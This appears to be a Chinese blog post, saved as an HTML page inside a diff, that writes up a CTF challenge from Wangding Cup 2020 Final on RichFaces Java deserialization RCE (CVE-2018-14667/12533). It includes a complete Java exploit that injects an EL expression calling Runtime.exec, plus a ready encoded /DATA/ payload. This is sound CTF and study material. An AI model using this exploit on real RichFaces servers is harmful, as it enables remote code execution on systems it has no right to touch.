@@ -1,0 +1,513 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="小喇叭">
+  <meta name="keywords" content="">
+  <title>JAVA反序列化题目-网鼎杯 2020 Final - 小喇叭</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>xiaolaba's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="JAVA反序列化题目-网鼎杯 2020 Final">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-02-19 15:43" pubdate>
+        2021年2月19日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      30
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">JAVA反序列化题目-网鼎杯 2020 Final</h1>
+            
+            <div class="markdown-body">
+              <h1 id="JAVA反序列化题目-网鼎杯-2020-Final"><a href="#JAVA反序列化题目-网鼎杯-2020-Final" class="headerlink" title="JAVA反序列化题目-网鼎杯 2020 Final"></a>JAVA反序列化题目-网鼎杯 2020 Final</h1><h2 id="0x00-richfaces介绍"><a href="#0x00-richfaces介绍" class="headerlink" title="0x00 richfaces介绍"></a>0x00 richfaces介绍</h2><p><strong>RichFaces</strong>是一个开放源代码的JavaServer Faces组件库，帮助企业级Java应用程序集成AJAX相关的功能，由WildFly（原名JBoss）提供支援。</p>
+<h2 id="0X01漏洞介绍"><a href="#0X01漏洞介绍" class="headerlink" title="0X01漏洞介绍"></a>0X01漏洞介绍</h2><p>richfaces有两种加载资源的方式，一种是在url里加<code>/DATB/</code>,一种是在url里加<code>/DATA/</code>，它们前面表示的是类位置，后面接有一些内容，在<code>DATA</code>后接的内容是经过序列化后的数据，可以构造出恶意的数据造成RCE</p>
+<h3 id="例子一-DATB"><a href="#例子一-DATB" class="headerlink" title="例子一 :/DATB/"></a>例子一 :/DATB/</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span><span class="hljs-regexp">/wdb_war/</span>a4j<span class="hljs-regexp">/s/</span><span class="hljs-number">3</span>_3_1.BETA2<span class="hljs-regexp">/org/</span>richfaces<span class="hljs-regexp">/skin.xcss/</span>DATB/eAF7sqpgb-jyGdIAFrMEaw__.jsf<br></code></pre></td></tr></table></figure>
+<p>重点在<code>ResourceBuilderImpl#getResourceDataForKey</code>,可以看到传进的key是<code>/org/richfaces/skin.xcss/DATB/eAF7sqpgb-jyGdIAFrMEaw__</code>,即去掉<code>/a4j/s/3_3_1.BETA2</code>和<code>.jsf</code>的字段。然后会进入正则匹配,而 匹配的就是<code>DATA_SEPARATOR_PATTERN = Pattern.compile(&quot;/DAT(A|B)/&quot;);</code>，是否存在<code>DATA</code>或<code>DATB</code>,然后截取到最后一个反斜杠后面的内容，进入到解码中</p>
+<p><img src="https://i.loli.net/2021/02/11/uhi578adYZKfX3y.png" srcset="/img/loading.gif"></p>
+<p>先用<code>ISO-8859-1</code>获取字节，然后进入<code>decrypt</code>方法，好像是个zip解压缩（不是很清楚，不过也无事</p>
+<p><img src="https://i.loli.net/2021/02/11/b5dSTBQs1lxuNoY.png" srcset="/img/loading.gif"></p>
+<p>再回到<code>ResourceBuilderImpl#getResourceDataForKey</code>,如果是<code>DATB</code>就直接返回数据，如果是<code>DATA</code>,还会进入反序列化中(这也是触发点)</p>
+<p><img src="https://i.loli.net/2021/02/11/lDQqczGX56eRZOF.png" srcset="/img/loading.gif"></p>
+<h3 id="例子二-DATA"><a href="#例子二-DATA" class="headerlink" title="例子二: /DATA/"></a>例子二: /DATA/</h3><p>根据上面的截图，可以看到它实现了一个<code>ObjectInputStream</code>的子类，加入了一些白名单</p>
+<p><img src="https://i.loli.net/2021/02/11/FxaP5XK9dAEN4Zz.png" srcset="/img/loading.gif"></p>
+<p>看到这个类的初始化代码,白名单里有一些基础类，再看到<code>loadwhitelist</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> &#123;<br>        PRIMITIVE_TYPES.put(<span class="hljs-string">&quot;bool&quot;</span>, Boolean.TYPE);<br>        PRIMITIVE_TYPES.put(<span class="hljs-string">&quot;byte&quot;</span>, Byte.TYPE);<br>        PRIMITIVE_TYPES.put(<span class="hljs-string">&quot;char&quot;</span>, Character.TYPE);<br>        PRIMITIVE_TYPES.put(<span class="hljs-string">&quot;short&quot;</span>, Short.TYPE);<br>        PRIMITIVE_TYPES.put(<span class="hljs-string">&quot;int&quot;</span>, Integer.TYPE);<br>        PRIMITIVE_TYPES.put(<span class="hljs-string">&quot;long&quot;</span>, Long.TYPE);<br>        PRIMITIVE_TYPES.put(<span class="hljs-string">&quot;float&quot;</span>, Float.TYPE);<br>        PRIMITIVE_TYPES.put(<span class="hljs-string">&quot;double&quot;</span>, Double.TYPE);<br>        PRIMITIVE_TYPES.put(<span class="hljs-string">&quot;void&quot;</span>, Void.TYPE);<br>        whitelistClassNameCache.put((<span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]).getClass().getName(), Boolean.TRUE);<br>        whitelistClassNameCache.put((<span class="hljs-keyword">new</span> String[<span class="hljs-number">0</span>]).getClass().getName(), Boolean.TRUE);<br>        whitelistClassNameCache.put((<span class="hljs-keyword">new</span> Boolean[<span class="hljs-number">0</span>]).getClass().getName(), Boolean.TRUE);<br>        whitelistClassNameCache.put((<span class="hljs-keyword">new</span> Byte[<span class="hljs-number">0</span>]).getClass().getName(), Boolean.TRUE);<br>        whitelistClassNameCache.put((<span class="hljs-keyword">new</span> Character[<span class="hljs-number">0</span>]).getClass().getName(), Boolean.TRUE);<br>        whitelistClassNameCache.put((<span class="hljs-keyword">new</span> Short[<span class="hljs-number">0</span>]).getClass().getName(), Boolean.TRUE);<br>        whitelistClassNameCache.put((<span class="hljs-keyword">new</span> Integer[<span class="hljs-number">0</span>]).getClass().getName(), Boolean.TRUE);<br>        whitelistClassNameCache.put((<span class="hljs-keyword">new</span> Long[<span class="hljs-number">0</span>]).getClass().getName(), Boolean.TRUE);<br>        whitelistClassNameCache.put((<span class="hljs-keyword">new</span> Float[<span class="hljs-number">0</span>]).getClass().getName(), Boolean.TRUE);<br>        whitelistClassNameCache.put((<span class="hljs-keyword">new</span> Double[<span class="hljs-number">0</span>]).getClass().getName(), Boolean.TRUE);<br>        whitelistClassNameCache.put((<span class="hljs-keyword">new</span> Void[<span class="hljs-number">0</span>]).getClass().getName(), Boolean.TRUE);<br>        whitelistBaseClasses.add(String.class);<br>        whitelistBaseClasses.add(Boolean.class);<br>        whitelistBaseClasses.add(Byte.class);<br>        whitelistBaseClasses.add(Character.class);<br>        whitelistBaseClasses.add(Number.class);<br>        loadWhitelist();<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">String whiteList = <span class="hljs-string">&quot;</span><br><span class="hljs-string">  	org.ajax4jsf.resource.InternetResource,</span><br><span class="hljs-string">  	org.ajax4jsf.resource.SerializableResource,</span><br><span class="hljs-string">	javax.el.Expression,javax.faces.el.MethodBinding,</span><br><span class="hljs-string">	javax.faces.component.StateHolderSaver,</span><br><span class="hljs-string">	java.awt.Color,</span><br><span class="hljs-string">	org.richfaces.renderkit.html.Paint2DResource$ImageData,</span><br><span class="hljs-string">	org.richfaces.demo.paint2d.PaintData&quot;</span>;<br>        <br>        String[] var1 = whiteList.split(<span class="hljs-string">&quot;,&quot;</span>);<br>        <span class="hljs-keyword">int</span> var2 = var1.length;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> var3 = <span class="hljs-number">0</span>; var3 &lt; var2; ++var3) &#123;<br>            String baseClassName = var1[var3];<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                Class&lt;?&gt; baseClass = Class.forName(baseClassName);<br>                whitelistBaseClasses.add(baseClass);<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var6) &#123;<br>            &#125;<br>        &#125;<br><br></code></pre></td></tr></table></figure>
+<p>多了7个类，到时候反序列化要利用的类就在这里找了</p>
+<p>回到<code>LookAheadObjectInputStream#resolveClass</code>,它又调用<code>isClassValid</code>,它判断一个类能不能被反序列化的条件是此类可以被强制转换为另外一个在白名单中的实例对象，即此类是否是白名单中某个类的子类或接口实现类，这样能大大增加我们可以利用的类，如果通过判断就能被正常反序列化了</p>
+<p><img src="https://i.loli.net/2021/02/11/t13v5KomqclyxiR.png" srcset="/img/loading.gif"></p>
+<h2 id="0x02漏洞复现"><a href="#0x02漏洞复现" class="headerlink" title="0x02漏洞复现"></a>0x02漏洞复现</h2><p>在网上存在的CVE有<code>CVE-2018-14667</code>和<code>CVE-2018-12533</code>，我直接用了网上现成的exp都没能打成功，于是自己看了看代码，发现有几处修改了的地方，进而对exp加以修改，从而成功RCE</p>
+<p>先上EXP</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> wdb;<br><span class="hljs-keyword">import</span> org.jboss.el.ValueExpressionImpl;<br><span class="hljs-keyword">import</span> com.sun.facelets.el.LegacyMethodBinding;<br><span class="hljs-keyword">import</span> com.sun.facelets.el.TagMethodExpression;<br><span class="hljs-keyword">import</span> com.sun.facelets.tag.TagAttribute;<br><span class="hljs-keyword">import</span> com.sun.facelets.tag.Location;<br><span class="hljs-keyword">import</span> org.ajax4jsf.util.base64.URL64Codec;<br><span class="hljs-keyword">import</span> org.jboss.el.MethodExpressionImpl;<br><span class="hljs-keyword">import</span> org.richfaces.ui.application.StateMethodExpressionWrapper;<br><br><span class="hljs-keyword">import</span> javax.faces.context.FacesContext;<br><span class="hljs-keyword">import</span> javax.faces.el.MethodBinding;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><span class="hljs-keyword">import</span> java.util.zip.Deflater;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        String pocEL = <span class="hljs-string">&quot;#&#123;paintBean.paint &#125;&quot;</span>;<br>        String pocEL1 = <span class="hljs-string">&quot;#&#123;request.getClass().getClassLoader().loadClass(\&quot;java.lang.Runtime\&quot;).getMethod(\&quot;getRuntime\&quot;).invoke(null).exec(\&quot;calc\&quot;)&#125;&quot;</span>;<br>        Class cls = Class.forName(<span class="hljs-string">&quot;javax.faces.component.StateHolderSaver&quot;</span>);<br>        Constructor ct = cls.getDeclaredConstructor(FacesContext.class, Object.class);<br>        ct.setAccessible(<span class="hljs-keyword">true</span>);<br><br>        Location location = <span class="hljs-keyword">new</span> Location(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        TagAttribute tagAttribute = <span class="hljs-keyword">new</span> TagAttribute(location, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;createContent=&quot;</span>+pocEL);<br><br>        <span class="hljs-comment">// 1. 设置ImageData</span><br>        <span class="hljs-comment">//    构造ImageData_paint</span><br>        MethodExpressionImpl methodExpression = <span class="hljs-keyword">new</span> MethodExpressionImpl(pocEL, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Class[]&#123;OutputStream.class, Object.class&#125;);<br>        ValueExpressionImpl ValueExpression = <span class="hljs-keyword">new</span> ValueExpressionImpl(pocEL1,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br>        StateMethodExpressionWrapper StateMethodE = <span class="hljs-keyword">new</span> StateMethodExpressionWrapper(methodExpression,ValueExpression);<br>        TagMethodExpression tagMethodExpression = <span class="hljs-keyword">new</span> TagMethodExpression(tagAttribute, StateMethodE);<br>        MethodBinding methodBinding = <span class="hljs-keyword">new</span> LegacyMethodBinding(tagMethodExpression);<br>        Object _paint = ct.newInstance(<span class="hljs-keyword">null</span>, methodBinding);<br><br>        Class clzz = Class.forName(<span class="hljs-string">&quot;org.richfaces.renderkit.html.Paint2DResource&quot;</span>);<br>        Class innerClazz[] = clzz.getDeclaredClasses();<br>        <span class="hljs-keyword">for</span> (Class c : innerClazz)&#123;<br>            <span class="hljs-keyword">int</span> mod = c.getModifiers();<br>            String modifier = Modifier.toString(mod);<br>            <span class="hljs-keyword">if</span> (modifier.contains(<span class="hljs-string">&quot;private&quot;</span>))&#123;<br>                Constructor cc = c.getDeclaredConstructor();<br>                cc.setAccessible(<span class="hljs-keyword">true</span>);<br>                Object imageData = cc.newInstance(<span class="hljs-keyword">null</span>);<br><br>                <span class="hljs-comment">//    设置ImageData_width</span><br>                Field _widthField = imageData.getClass().getDeclaredField(<span class="hljs-string">&quot;_width&quot;</span>);<br>                _widthField.setAccessible(<span class="hljs-keyword">true</span>);<br>                _widthField.set(imageData, <span class="hljs-number">300</span>);<br><br>                <span class="hljs-comment">//    设置ImageData_height</span><br>                Field _heightField = imageData.getClass().getDeclaredField(<span class="hljs-string">&quot;_height&quot;</span>);<br>                _heightField.setAccessible(<span class="hljs-keyword">true</span>);<br>                _heightField.set(imageData, <span class="hljs-number">120</span>);<br><br>                <span class="hljs-comment">//    设置ImageData_data</span><br>                Field _dataField = imageData.getClass().getDeclaredField(<span class="hljs-string">&quot;_data&quot;</span>);<br>                _dataField.setAccessible(<span class="hljs-keyword">true</span>);<br>                _dataField.set(imageData, <span class="hljs-keyword">null</span>);<br><br>                <span class="hljs-comment">//    设置ImageData_format</span><br>                Field _formatField = imageData.getClass().getDeclaredField(<span class="hljs-string">&quot;_format&quot;</span>);<br>                _formatField.setAccessible(<span class="hljs-keyword">true</span>);<br>                _formatField.set(imageData, <span class="hljs-number">2</span>);<br><br>                <span class="hljs-comment">//    设置ImageData_paint</span><br>                Field _paintField = imageData.getClass().getDeclaredField(<span class="hljs-string">&quot;_paint&quot;</span>);<br>                _paintField.setAccessible(<span class="hljs-keyword">true</span>);<br>                _paintField.set(imageData, _paint);<br><br>                <span class="hljs-comment">//    设置ImageData_paint</span><br>                Field cacheableField = imageData.getClass().getDeclaredField(<span class="hljs-string">&quot;cacheable&quot;</span>);<br>                cacheableField.setAccessible(<span class="hljs-keyword">true</span>);<br>                cacheableField.set(imageData, <span class="hljs-keyword">false</span>);<br><br>                <span class="hljs-comment">//    设置ImageData_bgColor</span><br>                Field _bgColorField = imageData.getClass().getDeclaredField(<span class="hljs-string">&quot;_bgColor&quot;</span>);<br>                _bgColorField.setAccessible(<span class="hljs-keyword">true</span>);<br>                _bgColorField.set(imageData, <span class="hljs-number">0</span>);<br><br>                <br>                <span class="hljs-comment">// 2. 序列化</span><br>                ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>                ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>                objectOutputStream.writeObject(imageData);<br>                objectOutputStream.flush();<br>                objectOutputStream.close();<br>                byteArrayOutputStream.close();<br><br>                <span class="hljs-comment">// 3. 加密（zip+base64）</span><br>                <span class="hljs-keyword">byte</span>[] pocData = byteArrayOutputStream.toByteArray();<br>                Deflater compressor = <span class="hljs-keyword">new</span> Deflater(<span class="hljs-number">1</span>);<br>                <span class="hljs-keyword">byte</span>[] compressed = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[pocData.length + <span class="hljs-number">100</span>];<br>                compressor.setInput(pocData);<br>                compressor.finish();<br>                <span class="hljs-keyword">int</span> totalOut = compressor.deflate(compressed);<br>                <span class="hljs-keyword">byte</span>[] zipsrc = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[totalOut];<br>                System.arraycopy(compressed, <span class="hljs-number">0</span>, zipsrc, <span class="hljs-number">0</span>, totalOut);<br>                compressor.end();<br>                <span class="hljs-keyword">byte</span>[]dataArray = URL64Codec.encodeBase64(zipsrc);<br><br>                <span class="hljs-comment">// 4. 打印最后的poc</span><br>                String poc = <span class="hljs-string">&quot;/DATA/&quot;</span> + <span class="hljs-keyword">new</span> String(dataArray, <span class="hljs-string">&quot;ISO-8859-1&quot;</span>) + <span class="hljs-string">&quot;.jsf&quot;</span>;<br>                System.out.println(poc);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<p>payload</p>
+<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">/DATA/eAF1U89r1EAUnl2orW0P1RbrD4R1K3YrZbZ4EGpdkLaiC6mVrlTbHpbZ7Gsy7SSTTibd6FLRgxcvIsWbN09CC4L!gN5E8NK!QAURD0IRvKpvktqli-aSx-Sb7!ve9162vpOOUJGLUjlUcdtdZjaEVIFfB7XKNXW1J-hNxn19YXoOQhkpG86WPebANNOs9G7nc9!vl6-ypLNMuqo1Z0oKqcqks7oslce0qVzgjovVoWqD17W7SA7bzHaB1QRYpKNaRxpNjlorbJ0VBfOd4mxtBWw9YeGNwAivkfskEwckfbL4ignJjJIAfZ8z12KauralF0gffE0ryAnXpcAmKmwd1ML716XN5x9msiRrob5gYXiDeXBQt6IV9x3U7Q7xTj3h0ORY6ozLYgUUZ4LfM84n4sDID6MkDSM!MSBAhxQEtcBh9t0Z0K6sT3K!jqR73jNZkrFIxtPkVMIaF0EUU-DVOFAQhlz6SP0!<span class="hljs-number">5</span>lvMaUf!Ze7FVBQ5kcaBJtpxa9Zgz-KTT7sYH-L693Et3RePHld-LO5cNgjjYPzgSkScsiAQ3GYaTaYJt4vcVggBRQvPHl7amvuSpD1QYyGkI21paXKyFcA8ExG0vpnBBww3MBl8V2zG34N-csbPSk2GSchtl8peIMa3N7rvbOrhNIrj-y22QRvdD5Y-vvn11PRpuHsbTdIYaipYiyDU1AE9ZfajMLJfWpLhIuGBwCL9mDfs1KwrnYt8zT3IJ!g0kUIeWVrn3F-Xq1DwIyFGKMRgF!I2E3Z-ZIOQIIixtzMHemuP1TRX2x382fP2yIxpLkmkMUj6h5rJDzIJzKdJlUPGCMe7lKSb-ttb6-<span class="hljs-number">2</span>d-a!fTjevJePFrclqMpA0wSWdjXQQaQQCw93sa!WWzg09NkbJ-dyVsdGxXClvI0zDlPQ1zqj0Dw!<span class="hljs-number">5</span>-A9Rb3ui.jsf<br><br></code></pre></td></tr></table></figure>
+
+
+<p>效果图</p>
+<p><img src="https://i.loli.net/2021/02/11/XtLIMugNb8Vsicq.png" srcset="/img/loading.gif"></p>
+<h3 id="0x03漏洞调试"><a href="#0x03漏洞调试" class="headerlink" title="0x03漏洞调试"></a>0x03漏洞调试</h3><p>进入页面后，如果要利用<code>UserSources</code>进行RCE，要先点开<code>http://localhost:8080/wdb_war/richfaces/mediaOutput.jsf?c=mediaOutput&amp;tab=usage</code></p>
+<p>这时会从<code>InternetResourceService#serviceResource</code>进入，<code>ResourceBuilderImpl#getResourceForKey</code>,然后获取类的路径，再进入getResource</p>
+<p><img src="https://i.loli.net/2021/02/11/2j7u6UxAiVh9m4b.png" srcset="/img/loading.gif"></p>
+<p>在this.resources中找是否已经注册，如果没找到就报错，而如果刚启动服务就直接去触发rce，就会报错这样的报错，因为一开始这些类还没注册，那么他们在哪里注册进去呢？</p>
+<p><img src="https://i.loli.net/2021/02/11/rRXQBKI15JHCM7T.png" srcset="/img/loading.gif"></p>
+<p><img src="https://i.loli.net/2021/02/11/WOdDQUBTLeIR5rK.png" srcset="/img/loading.gif"></p>
+<p>在<code>createDynamicResource</code>和<code>createUserResource</code>中有注册的操作</p>
+<p>点开<code>http://localhost:8080/wdb_war/richfaces/mediaOutput.jsf?c=mediaOutput&amp;tab=usage</code>就会触发注册操作</p>
+<p>大致调用栈</p>
+<p><img src="https://i.loli.net/2021/02/11/U1dCfwRrgNpq6Ee.png" srcset="/img/loading.gif"></p>
